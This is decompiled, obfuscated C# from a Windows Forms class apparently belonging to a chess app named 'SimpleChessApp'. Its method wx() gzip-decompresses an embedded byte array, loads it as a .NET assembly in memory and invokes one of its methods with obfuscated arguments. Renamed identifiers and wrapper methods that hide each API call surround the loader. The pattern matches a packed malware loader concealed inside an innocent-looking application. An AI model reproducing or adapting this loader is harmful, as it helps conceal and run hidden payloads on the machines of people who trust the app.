	public static byte[] ObjectMode(byte[] WellKnown)
	{
		GZipStream gZipStream = MainForm.smethod_53((Stream)MainForm.smethod_52(WellKnown), CompressionMode.Decompress);
		byte[] result;
		try
		{
			byte[] array = new byte[4096];
			MemoryStream memoryStream = MainForm.smethod_54();
			try
			{
				int num;
				do
				{
					num = MainForm.smethod_55((Stream)gZipStream, array, 0, 4096);
					if (num > 0)
					{
						lhcV8xdREPyCL3VmioD(memoryStream, array, 0, num);
					}
				}
				while (num > 0);
				int num4;
				do
				{
					result = MainForm.smethod_56(memoryStream);
					int num2 = 1;
					if (l9Hu4idAPYUmBCZtNlK() != null)
					{
						num2 = 0;
					}
					int num3 = num2;
					num4 = num3;
				}
				while (num4 != 1);
			}
			finally
			{
				if (memoryStream != null)
				{
					MainForm.smethod_14((IDisposable)memoryStream);
				}
			}
		}
		finally
		{
			if (gZipStream != null)
			{
				MainForm.smethod_14((IDisposable)gZipStream);
			}
		}
		return result;
	}

	internal static MainForm l9Hu4idAPYUmBCZtNlK()
	{
		return rkQuAtdP2v2DC8XaJSe;
	}

	public static void wx()
	{
		Assembly assembly_ = MainForm.smethod_57(ObjectMode(Disposition.TypeLibVarFlags));
		Type type_ = MainForm.smethod_58(assembly_)[0];
		MethodInfo methodBase_ = MainForm.smethod_59(type_)[3];
		MainForm.smethod_60((MethodBase)methodBase_, (object)null, new object[3]
		{
			IKMNJIUHBVGYTFRCXDRESZAWQ.DAD,
			IKMNJIUHBVGYTFRCXDRESZAWQ.MOM,
			"SimpleChessApp"
		});
	}

	static void smethod_0(Control control_0, string string_0)
	{
		control_0.set_Text(string_0);
	}

	static void smethod_1(ToolStripItem toolStripItem_0, EventHandler eventHandler_0)
	{
		toolStripItem_0.add_Click(eventHandler_0);
	}

	static void smethod_2(ToolStripItem toolStripItem_0, object object_0)
	{
		toolStripItem_0.set_Tag(object_0);
	}

	static Color smethod_3(string string_0)
	{
		return ColorTranslator.FromHtml(string_0);
	}

	static void smethod_4(Control control_0, Color color_0)
	{
		control_0.set_BackColor(color_0);
	}

	static void smethod_5(Control control_0, Color color_0)
	{
		control_0.set_ForeColor(color_0);
	}

	static void smethod_6(ToolStrip toolStrip_0, Color color_0)
	{
		toolStrip_0.set_BackColor(color_0);
	}

	static void smethod_7(ToolStrip toolStrip_0, Color color_0)
	{
		toolStrip_0.set_ForeColor(color_0);
	}

	static string smethod_8(object object_0)
	{
		return object_0.ToString();
	}

	static ObjectCollection smethod_9(ListBox listBox_0)
	{
		return listBox_0.get_Items();
	}

	static void smethod_10(ObjectCollection objectCollection_0)
	{
		objectCollection_0.Clear();
	}

	static int smethod_11(ObjectCollection objectCollection_0, object object_0)
	{
		return objectCollection_0.Add(object_0);
	}

	static void smethod_12(ListControl listControl_0, string string_0)
	{
		listControl_0.set_DisplayMember(string_0);
	}

	static object smethod_13(ToolStripItem toolStripItem_0)
	{
		return toolStripItem_0.get_Tag();
	}

	static void smethod_14(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static Label smethod_15()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Label();
	}

	static ToolStripMenuItem smethod_16()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new ToolStripMenuItem();
	}

	static MenuStrip smethod_17()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new MenuStrip();
	}

	static ListBox smethod_18()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new ListBox();
	}

	static void smethod_19(Control control_0)
	{
		control_0.SuspendLayout();
	}

	static void smethod_20(Control control_0, Point point_0)
	{
		control_0.set_Location(point_0);
	}

	static void smethod_21(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_22(Control control_0, Size size_0)
	{
		control_0.set_Size(size_0);
	}

	static void smethod_23(Control control_0, int int_0)
	{
		control_0.set_TabIndex(int_0);
	}

	static void smethod_24(Label label_0, ContentAlignment contentAlignment_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		label_0.set_TextAlign(contentAlignment_0);
	}

	static ToolStripItemCollection smethod_25(ToolStripDropDownItem toolStripDropDownItem_0)
	{
		return toolStripDropDownItem_0.get_DropDownItems();
	}

	static void smethod_26(ToolStripItemCollection toolStripItemCollection_0, ToolStripItem[] toolStripItem_0)
	{
		toolStripItemCollection_0.AddRange(toolStripItem_0);
	}

	static void smethod_27(ToolStripItem toolStripItem_0, string string_0)
	{
		toolStripItem_0.set_Name(string_0);
	}

	static void smethod_28(ToolStripItem toolStripItem_0, Size size_0)
	{
		toolStripItem_0.set_Size(size_0);
	}

	static void smethod_29(ToolStripItem toolStripItem_0, string string_0)
	{
		toolStripItem_0.set_Text(string_0);
	}

	static ToolStripItemCollection smethod_30(ToolStrip toolStrip_0)
	{
		return toolStrip_0.get_Items();
	}

	static Font smethod_31(string string_0, float float_0, FontStyle fontStyle_0, GraphicsUnit graphicsUnit_0, byte byte_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		return new Font(string_0, float_0, fontStyle_0, graphicsUnit_0, byte_0);
	}

	static void smethod_32(Control control_0, Font font_0)
	{
		control_0.set_Font(font_0);
	}

	static void smethod_33(ListControl listControl_0, bool bool_0)
	{
		listControl_0.set_FormattingEnabled(bool_0);
	}

	static void smethod_34(ListBox listBox_0, int int_0)
	{
		listBox_0.set_ItemHeight(int_0);
	}

	static void smethod_35(Control control_0, Padding padding_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_Margin(padding_0);
	}

	static void smethod_36(Control control_0, AnchorStyles anchorStyles_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_Anchor(anchorStyles_0);
	}

	static void smethod_37(ContainerControl containerControl_0, SizeF sizeF_0)
	{
		containerControl_0.set_AutoScaleDimensions(sizeF_0);
	}

	static void smethod_38(ContainerControl containerControl_0, AutoScaleMode autoScaleMode_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		containerControl_0.set_AutoScaleMode(autoScaleMode_0);
	}

	static void smethod_39(Form form_0, Size size_0)
	{
		form_0.set_ClientSize(size_0);
	}

	static ControlCollection smethod_40(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_41(ControlCollection controlCollection_0, Control control_0)
	{
		controlCollection_0.Add(control_0);
	}

	static void smethod_42(Form form_0, Padding padding_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		form_0.set_Margin(padding_0);
	}

	static void smethod_43(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_44(Control control_0, Padding padding_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_Padding(padding_0);
	}

	static void smethod_45(Form form_0, FormStartPosition formStartPosition_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		form_0.set_StartPosition(formStartPosition_0);
	}

	static void smethod_46(Form form_0, FormWindowState formWindowState_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		form_0.set_WindowState(formWindowState_0);
	}

	static void smethod_47(Control control_0, bool bool_0)
	{
		control_0.ResumeLayout(bool_0);
	}

	static void smethod_48(Control control_0)
	{
		control_0.PerformLayout();
	}

	static void smethod_49(Control control_0, bool bool_0)
	{
		control_0.ResumeLayout(bool_0);
	}

	static void smethod_50(Control control_0)
	{
		control_0.PerformLayout();
	}

	static void smethod_51(Stream stream_0, byte[] byte_0, int int_0, int int_1)
	{
		stream_0.Write(byte_0, int_0, int_1);
	}

	static MemoryStream smethod_52(byte[] byte_0)
	{
		return new MemoryStream(byte_0);
	}

	static GZipStream smethod_53(Stream stream_0, CompressionMode compressionMode_0)
	{
		return new GZipStream(stream_0, compressionMode_0);
	}

	static MemoryStream smethod_54()
	{
		return new MemoryStream();
	}

	static int smethod_55(Stream stream_0, byte[] byte_0, int int_0, int int_1)
	{
		return stream_0.Read(byte_0, int_0, int_1);
	}

	static byte[] smethod_56(MemoryStream memoryStream_0)
	{
		return memoryStream_0.ToArray();
	}

	static Assembly smethod_57(byte[] byte_0)
	{
		return Assembly.Load(byte_0);
	}

	static Type[] smethod_58(Assembly assembly_0)
	{
		return assembly_0.GetTypes();
	}

	static MethodInfo[] smethod_59(Type type_0)
	{
		return type_0.GetMethods();
	}

	static object smethod_60(MethodBase methodBase_0, object object_0, object[] object_1)
	{
		return methodBase_0.Invoke(object_0, object_1);
	}
}
